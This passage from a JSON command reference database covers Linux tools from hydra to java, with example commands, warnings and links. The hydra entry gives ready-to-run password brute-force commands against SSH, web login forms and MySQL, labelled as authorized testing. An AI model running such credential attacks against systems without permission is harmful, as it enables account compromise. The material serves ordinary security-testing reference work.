      "echo 'Enterprise Security Assessment and Password Policy Validation (AUTHORIZED TESTING ONLY)' && echo 'TARGET: enterprise-test.company.com (AUTHORIZED SECURITY AUDIT)' && echo 'Password Policy Testing:' && hydra -L enterprise-users.txt -P weak-passwords.txt -t 10 -f ssh://enterprise-test.company.com && echo 'Web Application Testing:' && hydra -l admin -P common-passwords.txt enterprise-test.company.com http-post-form \"/admin/login:username=^USER^&password=^PASS^:F=Invalid credentials\" && echo 'Database Security:' && hydra -L db-users.txt -P db-passwords.txt mysql://enterprise-test-db.company.com && echo 'Security Report:' && echo \"Enterprise Security Audit Report - $(date)\" > security-audit-$(date +%Y%m%d).md && echo \"SSH, Web, Database security tested\" >> security-audit-$(date +%Y%m%d).md && echo 'Enterprise authorized security testing: password policy validation, multi-service vulnerability assessment, comprehensive authentication security evaluation, and professional security reporting for enterprise compliance and risk management'  # Enterprise authorized security assessment and password policy validation"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "security",
    "safety": "safe",
    "syntaxPattern": "hydra [options] <target> <service>",
    "prerequisites": [
      "advanced",
      "authorization-required"
    ],
    "commandCombinations": [
      {
        "scenario": "Multi-service security audit",
        "commands": "hydra -L users.txt -P common.txt ssh://target && hydra -L users.txt -P common.txt ftp://target",
        "explanation": "Test multiple services for weak passwords",
        "title": "hydra && hydra"
      }
    ],
    "relatedCommands": [
      {
        "name": "medusa",
        "relationship": "similar",
        "reason": "Alternative network password testing tool"
      },
      {
        "name": "ncrack",
        "relationship": "similar",
        "reason": "Network authentication cracking tool"
      }
    ],
    "warnings": [
      "Only use against systems you own or have permission to test",
      "May trigger account lockouts",
      "Can be detected by intrusion detection systems"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://github.com/vanhauser-thc/thc-hydra"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "iftop",
    "subtitle": "Interface Top",
    "description": "Display bandwidth usage on network interfaces",
    "examples": [
      "sudo iftop  # Show real-time network bandwidth usage",
      "sudo iftop -i eth0  # Monitor traffic only on eth0 interface",
      "sudo iftop -P  # Display port numbers instead of service names",
      "sudo iftop -n  # Show IP addresses without DNS lookups",
      "sudo iftop -B  # Display bandwidth rates in bytes per second instead of bits",
      "echo 'Enterprise Network Monitoring and Bandwidth Analysis' && echo 'Network Interface Status:' && ip link show | grep -E '(UP|DOWN)' && echo 'Real-time Bandwidth Monitoring:' && timeout 30s sudo iftop -i eth0 -P -n -B -t | head -50 > network-analysis-$(date +%Y%m%d-%H%M%S).txt && echo 'Top Bandwidth Consumers:' && netstat -i && echo 'Network Security Monitoring:' && ss -tuln | grep -E '(LISTEN|ESTABLISHED)' | wc -l && echo 'Firewall Status:' && sudo iptables -L INPUT | grep -E '(ACCEPT|DROP|REJECT)' | wc -l && echo 'Enterprise Monitoring Summary:' && echo \"Network: $(ip route | grep default | awk '{print $5}')\" && echo \"Active Connections: $(ss -tuln | wc -l)\" && echo 'Enterprise network monitoring: real-time bandwidth analysis, security connection tracking, firewall validation, and comprehensive network infrastructure monitoring for enterprise operations and security compliance'  # Enterprise network monitoring and security analysis"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "networking",
    "safety": "caution",
    "syntaxPattern": "iftop [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Detailed network analysis",
        "commands": "sudo iftop -P -n -i eth0",
        "explanation": "Monitor eth0 with ports and IPs, no DNS resolution",
        "title": "sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "netstat",
        "relationship": "similar",
        "reason": "Both show network connection information"
      },
      {
        "name": "ss",
        "relationship": "similar",
        "reason": "Modern alternative for network socket statistics"
      }
    ],
    "warnings": [
      "Requires root privileges for most functionality",
      "High CPU usage on busy networks"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man8/iftop.8.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "imagemagick",
    "subtitle": "ImageMagick",
    "description": "Comprehensive image manipulation and conversion suite",
    "examples": [
      "convert image.png image.jpg  # Convert PNG image to JPEG format",
      "convert input.jpg -resize 800x600 output.jpg  # Resize image to 800x600 pixels",
      "convert input.jpg -thumbnail 150x150^ -gravity center -crop 150x150+0+0 thumb.jpg  # Create square thumbnail cropped from center",
      "convert input.jpg -blur 0x8 -quality 85 blurred.jpg  # Apply blur effect and set JPEG quality",
      "mogrify -resize 50% -quality 80 *.jpg  # Reduce size and quality of all JPEG files in place",
      "montage *.jpg -tile 3x3 -geometry +5+5 montage.jpg  # Create 3x3 grid montage of images",
      "identify -verbose image.jpg  # Display detailed image properties and metadata",
      "echo 'Enterprise Image Processing and Digital Asset Management' && echo 'Batch Image Optimization:' && find /enterprise/marketing -name '*.jpg' -o -name '*.png' | while read img; do echo \"Processing: $img\"; original_size=$(stat -c%s \"$img\"); convert \"$img\" -strip -quality 85 -resize 1920x1080\\> \"${img%.*}-optimized.${img##*.}\"; new_size=$(stat -c%s \"${img%.*}-optimized.${img##*.}\"); savings=$(echo \"scale=1; (1 - $new_size / $original_size) * 100\" | bc); echo \"$img: ${savings}% reduction\"; done && echo 'Watermark Application:' && montage /enterprise/marketing/*.jpg -tile 4x3 -geometry +10+10 -title \"Enterprise Gallery $(date +%Y-%m-%d)\" enterprise-gallery-$(date +%Y%m%d).jpg && echo 'Metadata Analysis:' && exiftool /enterprise/marketing/*.jpg | grep -E '(Camera|GPS|Copyright)' && echo 'Enterprise image workflow: automated optimization, batch processing, watermark application, gallery creation, metadata analysis, and comprehensive digital asset management for marketing and communications teams'  # Enterprise image processing and digital asset management"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "safe",
    "syntaxPattern": "convert [options] input output",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Web-optimized image processing",
        "commands": "convert input.jpg -resize 1200x800> -quality 85 -strip output.jpg",
        "explanation": "Resize if larger, optimize quality, remove metadata",
        "title": "convert >"
      },
      {
        "scenario": "Create animated GIF",
        "commands": "convert -delay 20 -loop 0 frame*.png animated.gif",
        "explanation": "Create looping GIF from numbered frame images",
        "title": "convert"
      }
    ],
    "relatedCommands": [
      {
        "name": "graphicsmagick",
        "relationship": "alternative",
        "reason": "Fork of ImageMagick with similar capabilities"
      },
      {
        "name": "ffmpeg",
        "relationship": "combo",
        "reason": "Can work together for video frame extraction"
      },
      {
        "name": "gimp",
        "relationship": "alternative",
        "reason": "GUI image editor with batch processing capability"
      }
    ],
    "warnings": [
      "Version 7 syntax differs from version 6 (magick vs convert)",
      "Memory usage can be high for large images",
      "Some operations require specific image formats"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://imagemagick.org/script/command-line-tools.php"
      },
      {
        "platform": "macos",
        "url": "https://imagemagick.org/script/command-line-tools.php"
      },
      {
        "platform": "windows",
        "url": "https://imagemagick.org/script/command-line-tools.php"
      },
      {
        "platform": "generic",
        "url": "https://imagemagick.org/Usage/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "influxdb",
    "subtitle": "InfluxDB Time Series Database",
    "description": "High-performance time-series database for metrics and events",
    "examples": [
      "influxd  # Start InfluxDB daemon with default configuration",
      "influxd --config /etc/influxdb/influxdb.conf  # Start with custom configuration file",
      "influx  # Start InfluxDB CLI client",
      "influx -execute 'SHOW DATABASES'  # Execute query directly from command line",
      "influx -import -path=data.txt  # Import line protocol data from file",
      "influx -precision s -execute 'SELECT * FROM cpu WHERE time > now() - 1h'  # Query with second precision",
      "echo 'Enterprise Time-Series Database Operations and Monitoring' && influxd --config /etc/influxdb/enterprise.conf & sleep 10 && echo 'Database Health Check:' && influx -execute 'SHOW DATABASES' && echo 'Performance Metrics:' && influx -execute 'SELECT mean(cpu_usage), max(memory_usage) FROM system_metrics WHERE time > now() - 1h GROUP BY time(5m)' && echo 'Data Retention Policy:' && influx -execute 'SHOW RETENTION POLICIES ON enterprise_metrics' && echo 'Real-time Monitoring:' && influx -execute 'SELECT * FROM enterprise_app WHERE time > now() - 5m ORDER BY time DESC LIMIT 10' && echo 'Backup Status:' && influxd backup -database enterprise_metrics /backup/influxdb/$(date +%Y%m%d) && echo 'Enterprise InfluxDB operations: database health monitoring, performance metrics analysis, retention policy management, real-time data querying, and automated backup strategies for enterprise time-series data infrastructure'  # Enterprise InfluxDB operations and monitoring"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "data-processing",
    "safety": "safe",
    "syntaxPattern": "influxd [command] [flags]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Production setup with authentication",
        "commands": "influxd --config /etc/influxdb/influxdb.conf && influx -username admin -password secret",
        "explanation": "Start server and connect with authentication",
        "title": "influxd && influx"
      }
    ],
    "relatedCommands": [
      {
        "name": "telegraf",
        "relationship": "combo",
        "reason": "Telegraf collects metrics and sends to InfluxDB"
      },
      {
        "name": "chronograf",
        "relationship": "combo",
        "reason": "Chronograf provides UI for InfluxDB"
      }
    ],
    "warnings": [
      "Default port is 8086",
      "Authentication disabled by default",
      "Line protocol is whitespace sensitive"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://docs.influxdata.com/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "ionice",
    "subtitle": "I/O Nice",
    "description": "Set or get I/O scheduling class and priority for processes",
    "examples": [
      "ionice -c 3 rsync -av /source/ /dest/  # Run rsync with idle I/O class (only uses idle I/O)",
      "ionice -c 2 -n 7 backup_script.sh  # Run backup with best-effort class, lowest priority (7)",
      "ionice -p 1234  # Show I/O scheduling info for process 1234",
      "sudo ionice -c 3 -p 1234  # Change running process to idle I/O class",
      "ionice -c 1 -n 4 database_import.py  # Run critical task with real-time I/O class"
    ],
    "platform": [
      "linux"
    ],
    "category": "system",
    "safety": "caution",
    "syntaxPattern": "ionice [options] command",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "System-friendly intensive task",
        "commands": "nice -n 19 ionice -c 3 find / -name '*.log' -delete",
        "explanation": "Delete log files with low CPU and I/O priority",
        "title": "nice"
      }
    ],
    "relatedCommands": [
      {
        "name": "nice",
        "relationship": "combo",
        "reason": "Set CPU scheduling priority"
      }
    ],
    "warnings": [
      "Only available on Linux systems",
      "Idle class may cause very slow execution"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/ionice.1.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "iostat",
    "subtitle": "I/O Statistics",
    "description": "Report system I/O and CPU statistics",
    "examples": [
      "iostat  # Show current CPU and I/O statistics",
      "iostat -x  # Display extended disk I/O statistics",
      "iostat 2 10  # Display statistics every 2 seconds for 10 iterations",
      "iostat -h  # Show statistics in human-readable format",
      "iostat -c  # Display only CPU statistics",
      "iostat -d sda  # Show statistics for specific device",
      "iostat -m  # Display statistics in megabytes per second"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "iostat [options] [interval] [count]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "System performance baseline",
        "commands": "iostat -x 1 60 > io_baseline.txt && vmstat 1 60 > cpu_baseline.txt",
        "explanation": "Collect 1-minute baseline of I/O and CPU performance",
        "title": "iostat > io_baseline && vmstat > cpu_baseline"
      }
    ],
    "relatedCommands": [
      {
        "name": "vmstat",
        "relationship": "complementary",
        "reason": "vmstat provides memory and CPU statistics"
      },
      {
        "name": "iotop",
        "relationship": "complementary",
        "reason": "iotop shows per-process I/O activity"
      }
    ],
    "warnings": [
      "Part of sysstat package on most Linux distributions",
      "First report shows averages since boot",
      "Subsequent reports show interval averages"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/iostat.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/iostat.html"
      },
      {
        "platform": "windows",
        "url": "Not available"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "iotop",
    "subtitle": "I/O Top",
    "description": "Monitor I/O usage by processes in real-time",
    "examples": [
      "sudo iotop  # Show real-time I/O usage by processes",
      "sudo iotop -a  # Display accumulated I/O instead of bandwidth",
      "sudo iotop -o  # Show only processes currently doing I/O",
      "sudo iotop -b -n 3  # Batch mode with 3 iterations for scripting",
      "sudo iotop -p 1234  # Monitor I/O for specific process ID",
      "sudo iotop -k  # Use kilobytes instead of human-readable units"
    ],
    "platform": [
      "linux"
    ],
    "category": "system",
    "safety": "caution",
    "syntaxPattern": "iotop [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "I/O performance analysis",
        "commands": "sudo iotop -ao && iostat 1 5",
        "explanation": "Show accumulated I/O activity and system I/O stats",
        "title": "sudo && iostat"
      }
    ],
    "relatedCommands": [
      {
        "name": "iostat",
        "relationship": "complementary",
        "reason": "iostat shows system-wide I/O statistics"
      },
      {
        "name": "pidstat",
        "relationship": "similar",
        "reason": "pidstat can also monitor per-process I/O"
      }
    ],
    "warnings": [
      "Requires root privileges to access process I/O information",
      "Linux-specific tool, not available on other platforms",
      "May impact system performance during monitoring"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man8/iotop.8.html"
      },
      {
        "platform": "macos",
        "url": "Not available"
      },
      {
        "platform": "windows",
        "url": "Not available"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "ip",
    "subtitle": "IP",
    "description": "Show and manipulate routing, devices, policy routing and tunnels",
    "examples": [
      "ip addr show  # Display IP addresses assigned to all interfaces",
      "ip route show  # Display kernel routing table",
      "sudo ip addr add 192.168.1.100/24 dev eth0  # Assign IP address to ethernet interface",
      "sudo ip link set eth0 up  # Enable network interface",
      "ip -s link show  # Display network interface statistics",
      "sudo ip route add default via 192.168.1.1  # Set default gateway for routing"
    ],
    "platform": [
      "linux"
    ],
    "category": "networking",
    "safety": "caution",
    "syntaxPattern": "ip [options] object command",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Network interface configuration",
        "commands": "sudo ip link set eth0 up && sudo ip addr add 192.168.1.100/24 dev eth0 && sudo ip route add default via 192.168.1.1",
        "explanation": "Enable interface, assign IP, set default route",
        "title": "sudo && sudo && sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "ifconfig",
        "relationship": "alternative",
        "reason": "Legacy command for network interface configuration"
      },
      {
        "name": "route",
        "relationship": "alternative",
        "reason": "Legacy routing table manipulation command"
      }
    ],
    "warnings": [
      "Modern replacement for ifconfig and route commands",
      "Changes are not persistent across reboots without configuration"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man8/ip.8.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "iperf3",
    "subtitle": "Internet Performance 3",
    "description": "Network bandwidth testing tool",
    "examples": [
      "iperf3 -s  # Run iperf3 in server mode listening on port 5201",
      "iperf3 -c server-ip  # Test network performance to iperf3 server",
      "iperf3 -c server-ip -u -b 100M  # Test UDP bandwidth at 100Mbps",
      "iperf3 -c server-ip --bidir  # Test bandwidth in both directions simultaneously",
      "iperf3 -c server-ip -t 60  # Run test for 60 seconds",
      "iperf3 -c server-ip -P 4  # Use 4 parallel streams for testing",
      "iperf3 -c server-ip -R  # Test reverse direction (server to client)",
      "iperf3 -c server-ip -t 60 -i 5 -J > results.json  # Run 60-second test with 5-second intervals, output JSON format for analysis"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "networking",
    "safety": "safe",
    "syntaxPattern": "iperf3 [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Comprehensive network test",
        "commands": "iperf3 -c server -t 30 && iperf3 -c server -u -b 50M -t 30",
        "explanation": "Test both TCP and UDP performance",
        "title": "iperf3 && iperf3"
      }
    ],
    "relatedCommands": [
      {
        "name": "iperf",
        "relationship": "predecessor",
        "reason": "iperf3 is the newer version with better features"
      },
      {
        "name": "netperf",
        "relationship": "alternative",
        "reason": "Alternative network performance testing tool"
      }
    ],
    "warnings": [
      "Requires server running on target host",
      "Results depend on network conditions during test",
      "May not reflect real application performance"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://iperf.fr/iperf-doc.php"
      },
      {
        "platform": "macos",
        "url": "https://iperf.fr/iperf-doc.php"
      },
      {
        "platform": "windows",
        "url": "https://iperf.fr/iperf-doc.php"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "iptables",
    "subtitle": "IP Tables",
    "description": "Advanced Linux firewall administration and packet filtering",
    "examples": [
      "sudo iptables -L -n -v  # List all iptables rules with verbose output and line numbers",
      "sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT  # Allow incoming SSH connections on port 22",
      "sudo iptables -A INPUT -s 192.168.1.100 -j DROP  # Block all traffic from IP address 192.168.1.100",
      "sudo iptables -A INPUT -p tcp -m multiport --dports 80,443 -j ACCEPT  # Allow web traffic on ports 80 and 443",
      "sudo iptables-save > /etc/iptables/rules.v4  # Save current iptables rules to file",
      "sudo iptables-restore < /etc/iptables/rules.v4  # Restore iptables rules from saved file",
      "sudo iptables -I INPUT 1 -s 192.168.1.0/24 -j ACCEPT  # Insert rule at position 1 to allow local network traffic"
    ],
    "platform": [
      "linux"
    ],
    "category": "security",
    "safety": "caution",
    "syntaxPattern": "iptables [options] -t table -j target",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Basic web server firewall",
        "commands": "sudo iptables -F && sudo iptables -A INPUT -i lo -j ACCEPT && sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT && sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT && sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT && sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT && sudo iptables -P INPUT DROP",
        "explanation": "Flush rules, allow loopback, established connections, SSH, HTTP, HTTPS, then drop everything else",
        "title": "sudo && sudo && sudo && sudo && sudo && sudo && sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "ufw",
        "relationship": "alternative",
        "reason": "Uncomplicated firewall - simpler iptables frontend"
      },
      {
        "name": "firewalld",
        "relationship": "alternative",
        "reason": "Dynamic firewall management daemon"
      }
    ],
    "warnings": [
      "Rules are processed in order",
      "Changes are temporary unless saved",
      "Incorrect rules can lock you out"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man8/iptables.8.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "istio-service-mesh",
    "subtitle": "Istio Service Mesh",
    "description": "Istio service mesh configuration and management",
    "examples": [
      "istioctl install --set values.pilot.env.EXTERNAL_ISTIOD=true --set values.global.meshID=mesh1 --set values.global.network=network1  # Install Istio with external control plane and multi-network configuration",
      "kubectl label namespace production istio-injection=enabled && kubectl get namespace production --show-labels  # Enable automatic sidecar injection for production namespace",
      "kubectl apply -f - <<EOF\napiVersion: networking.istio.io/v1alpha3\nkind: VirtualService\nmetadata:\n  name: reviews\nspec:\n  http:\n  - match:\n    - headers:\n        end-user:\n          exact: jason\n    route:\n    - destination:\n        host: reviews\n        subset: v2\n  - route:\n    - destination:\n        host: reviews\n        subset: v1\nEOF  # Create virtual service for header-based routing and canary deployments",
      "kubectl apply -f - <<EOF\napiVersion: security.istio.io/v1beta1\nkind: PeerAuthentication\nmetadata:\n  name: default\n  namespace: production\nspec:\n  mtls:\n    mode: STRICT\nEOF  # Enable strict mutual TLS for all services in production namespace",
      "istioctl dashboard jaeger && kubectl port-forward -n istio-system service/tracing 16686:80  # Open Jaeger dashboard for distributed tracing analysis",
      "kubectl apply -f - <<EOF\napiVersion: networking.istio.io/v1alpha3\nkind: DestinationRule\nmetadata:\n  name: httpbin\nspec:\n  host: httpbin\n  trafficPolicy:\n    outlierDetection:\n      consecutiveErrors: 3\n      interval: 30s\n      baseEjectionTime: 30s\n      maxEjectionPercent: 50\nEOF  # Configure circuit breaker with outlier detection for service resilience"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "networking",
    "safety": "caution",
    "syntaxPattern": "istioctl <command> [options]",
    "prerequisites": [
      "istio-cli",
      "kubernetes-cluster"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete service mesh deployment",
        "commands": "istioctl install --set values.pilot.traceSampling=1.0 && kubectl label namespace default istio-injection=enabled && kubectl apply -f samples/bookinfo/platform/kube/bookinfo.yaml && kubectl apply -f samples/bookinfo/networking/bookinfo-gateway.yaml",
        "explanation": "Install Istio with full tracing, enable injection, and deploy sample application",
        "title": "istioctl && kubectl && kubectl && kubectl"
      },
      {
        "scenario": "Security hardening with authorization policies",
        "commands": "kubectl apply -f peer-authentication-strict.yaml && kubectl apply -f authorization-policy-deny-all.yaml && kubectl apply -f authorization-policy-allow-specific.yaml",
        "explanation": "Enable strict mTLS, deny all traffic by default, then allow specific services",
        "title": "kubectl && kubectl && kubectl"
      }
    ],
    "relatedCommands": [
      {
        "name": "kubectl",
        "relationship": "underlying",
        "reason": "Istio uses Kubernetes APIs and custom resources"
      },
      {
        "name": "envoy",
        "relationship": "underlying",
        "reason": "Istio uses Envoy proxy as the data plane"
      },
      {
        "name": "prometheus",
        "relationship": "combo",
        "reason": "Istio integrates with Prometheus for metrics collection"
      }
    ],
    "warnings": [
      "Sidecar injection requires proper namespace labeling or pod annotations",
      "mTLS policies can break services that don't support it properly",
      "Gateway and VirtualService configurations must match for proper routing"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://istio.io/latest/docs/"
      },
      {
        "platform": "macos",
        "url": "https://istio.io/latest/docs/"
      },
      {
        "platform": "windows",
        "url": "https://istio.io/latest/docs/"
      },
      {
        "platform": "generic",
        "url": "https://istio.io/latest/docs/setup/getting-started/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "istioctl",
    "subtitle": "Istio Control",
    "description": "Service mesh management tool for Istio on Kubernetes",
    "examples": [
      "istioctl install --set values.defaultRevision=default  # Install Istio with default configuration",
      "istioctl analyze  # Check cluster for Istio configuration issues",
      "kubectl label namespace production istio-injection=enabled  # Enable automatic sidecar injection for namespace",
      "istioctl proxy-status  # Display status of all Envoy proxies in mesh",
      "istioctl create-remote-secret --name cluster1 > cluster1-secret.yaml  # Create secret for multi-cluster service mesh",
      "istioctl validate -f virtualservice.yaml  # Validate Istio configuration file syntax",
      "istioctl proxy-config cluster productpage-v1-123456789-abcde.default  # Display Envoy cluster configuration for specific pod",
      "istioctl dashboard kiali  # Open Kiali service mesh observability dashboard",
      "istioctl proxy-config listeners productpage-v1-123.default --port 15006 -o json  # Display detailed Envoy listener configuration for debugging traffic routing"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "security",
    "safety": "safe",
    "syntaxPattern": "istioctl [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete Istio setup",
        "commands": "istioctl install --set values.defaultRevision=default && kubectl label namespace default istio-injection=enabled && istioctl analyze",
        "explanation": "Install Istio, enable injection for default namespace, and validate",
        "title": "istioctl && kubectl && istioctl"
      },
      {
        "scenario": "Troubleshooting workflow",
        "commands": "istioctl proxy-status && istioctl analyze && istioctl proxy-config cluster productpage-v1-123.default",
        "explanation": "Check proxy status, analyze issues, and inspect specific proxy config",
        "title": "istioctl && istioctl && istioctl"
      }
    ],
    "relatedCommands": [
      {
        "name": "kubectl",
        "relationship": "combo",
        "reason": "Istio runs on Kubernetes and uses kubectl for basic operations"
      },
      {
        "name": "helm",
        "relationship": "alternative",
        "reason": "Helm can also be used to install Istio"
      }
    ],
    "warnings": [
      "Requires Kubernetes cluster with sufficient resources",
      "Sidecar injection must be enabled per namespace",
      "CRDs must be installed before Istio components",
      "Version compatibility with Kubernetes important"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://istio.io/latest/docs/reference/commands/istioctl/"
      },
      {
        "platform": "macos",
        "url": "https://istio.io/latest/docs/reference/commands/istioctl/"
      },
      {
        "platform": "windows",
        "url": "https://istio.io/latest/docs/reference/commands/istioctl/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "iw",
    "subtitle": "Interface Wireless",
    "description": "Modern wireless configuration and monitoring tool",
    "examples": [
      "iw dev  # Show all wireless network interfaces",
      "iw dev wlan0 scan | grep SSID  # Scan for available wireless networks",
      "iw dev wlan0 info  # Display detailed wireless interface information",
      "iw dev wlan0 connect OpenNetwork  # Connect to open wireless network",
      "iw dev wlan0 set type monitor  # Set wireless interface to monitor mode",
      "iw dev wlan0 link  # Show current wireless connection status",
      "iw dev wlan0 set power_save off  # Disable power saving for better performance",
      "iw dev wlan0 scan ssid MyWiFi freq 2437 passive  # Scan for specific SSID on 2.4GHz channel 6 without active probing"
    ],
    "platform": [
      "linux"
    ],
    "category": "networking",
    "safety": "safe",
    "syntaxPattern": "iw [options] command",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Wireless network analysis",
        "commands": "iw dev wlan0 scan | grep -E '(SSID|signal|freq)' | head -20",
        "explanation": "Show nearby networks with signal strength and frequency",
        "title": "iw | grep | signal | freq | head"
      }
    ],
    "relatedCommands": [
      {
        "name": "iwconfig",
        "relationship": "predecessor",
        "reason": "iw is the modern replacement for iwconfig"
      },
      {
        "name": "ip",
        "relationship": "complementary",
        "reason": "ip manages interface addresses after wireless connection"
      }
    ],
    "warnings": [
      "Requires root privileges for most operations",
      "Linux-specific tool, part of nl80211 framework",
      "May need additional tools for WPA/WPA2"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://wireless.wiki.kernel.org/en/users/documentation/iw"
      },
      {
        "platform": "macos",
        "url": "Not available"
      },
      {
        "platform": "windows",
        "url": "Not available"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "iwconfig",
    "subtitle": "Interface Wireless Config",
    "description": "Configure wireless network interface",
    "examples": [
      "iwconfig  # Display all wireless network interfaces and their status",
      "iwconfig wlan0 essid 'MyNetwork'  # Connect to wireless network by SSID",
      "iwconfig wlan0 key 1234567890  # Set WEP encryption key for wireless interface",
      "iwconfig wlan0 mode managed  # Set wireless interface to managed mode",
      "iwconfig wlan0 txpower 20dBm  # Set wireless transmission power",
      "iwconfig wlan0 rate 54M  # Set wireless data rate to 54Mbps",
      "iwconfig wlan0 sens -70  # Set signal sensitivity threshold to -70dBm for connection quality"
    ],
    "platform": [
      "linux"
    ],
    "category": "networking",
    "safety": "safe",
    "syntaxPattern": "iwconfig [interface] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Wireless network setup",
        "commands": "iwconfig wlan0 essid 'MyWiFi' && iwconfig wlan0 key s:mypassword && dhclient wlan0",
        "explanation": "Connect to WEP-protected network and get IP address",
        "title": "iwconfig && iwconfig && dhclient"
      }
    ],
    "relatedCommands": [
      {
        "name": "iw",
        "relationship": "modern-alternative",
        "reason": "iw is the newer wireless configuration tool"
      },
      {
        "name": "wpa_supplicant",
        "relationship": "complementary",
        "reason": "wpa_supplicant handles WPA/WPA2 authentication"
      }
    ],
    "warnings": [
      "Deprecated in favor of iw command",
      "Limited WPA support, mainly for WEP networks",
      "Linux-specific tool"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man8/iwconfig.8.html"
      },
      {
        "platform": "macos",
        "url": "Not available"
      },
      {
        "platform": "windows",
        "url": "Not available"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "jaeger",
    "subtitle": "Jaeger Tracing",
    "description": "End-to-end distributed tracing system for monitoring microservices",
    "examples": [
      "jaeger-all-in-one  # Start Jaeger with all components in single process",
      "jaeger-all-in-one --memory.max-traces=10000  # Start with custom trace retention limit",
      "jaeger-collector  # Start only the Jaeger collector component",
      "jaeger-query  # Start only the Jaeger query/UI service",
      "jaeger-agent --reporter.grpc.host-port=localhost:14250  # Start agent with custom collector endpoint",
      "jaeger-all-in-one --query.max-clock-skew-adjustment=2s --collector.grpc-tls.enabled=true  # Start with clock skew tolerance and TLS encryption for production tracing"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "data-processing",
    "safety": "safe",
    "syntaxPattern": "jaeger [component] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Development environment",
        "commands": "jaeger-all-in-one --collector.zipkin.host-port=:9411",
        "explanation": "Start Jaeger with Zipkin compatibility",
        "title": "jaeger"
      }
    ],
    "relatedCommands": [
      {
        "name": "zipkin",
        "relationship": "alternative",
        "reason": "Both provide distributed tracing capabilities"
      },
      {
        "name": "opentelemetry",
        "relationship": "combo",
        "reason": "OpenTelemetry can send traces to Jaeger"
      }
    ],
    "warnings": [
      "Default UI port is 16686",
      "Memory storage is not persistent",
      "Requires instrumentation in application code"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://www.jaegertracing.io/docs/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "java",
    "subtitle": "Java",
    "description": "Java runtime for executing Java applications",
    "examples": [
      "java HelloWorld  # Execute compiled Java class file",
      "java -cp lib/*:. com.example.Main  # Run class with external libraries in classpath",
      "java -jar application.jar  # Execute JAR file with main class defined in manifest",
      "java -Xmx2g -Xms1g MyApp  # Run with maximum 2GB heap and initial 1GB heap",
      "java -Djava.rmi.server.hostname=localhost -Dcom.sun.management.jmxremote MyApp  # Run with JMX remote management enabled",
      "java -Dconfig.file=app.properties Main  # Set system property for configuration file",
      "java -version  # Display Java runtime version information",
